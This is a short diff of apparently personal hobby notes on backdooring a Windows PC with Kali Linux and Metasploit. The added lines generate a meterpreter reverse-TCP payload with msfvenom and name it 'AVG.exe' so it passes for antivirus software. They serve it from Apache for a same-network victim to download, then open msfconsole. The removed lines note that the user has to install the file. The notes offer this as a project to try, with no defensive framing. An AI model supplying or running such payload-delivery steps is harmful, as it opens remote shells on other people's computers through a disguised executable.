@@ -1,16 +1,18 @@
 # Requires kali built in metasploit framework
 
-##https://www.instructables.com/Hack-Windows-PC-Using-Kali-Linux/
+## https://www.youtube.com/watch?v=g77XXAKc9qA
 
 This seems like interesting project to do.
 Simple enough to do it
 
-First create a payload that allows us to get into windows. (The user has to install this file)
-  > msfvenom -p windows/meterpreter/reverse_tcp - platform windows-a x86 -f exe -o /root/Desktop/back.exe
+> msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f exe > /root/Desktop/AVG.exe
 
-Not sure if it works but youtuber used this as back door
-- https://www.youtube.com/watch?v=NswVmCacnfs
-  > msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your_IP) LPORT=4444 -f exe > /root/Desktop/AVG.exe
+Move the file to /var/www/html
+cd into /var/www/html
+service apache2 start
+
+to download the file from same network computer,
+IP address/filename
 
 Then start metasploit framework console
   > msfconsole
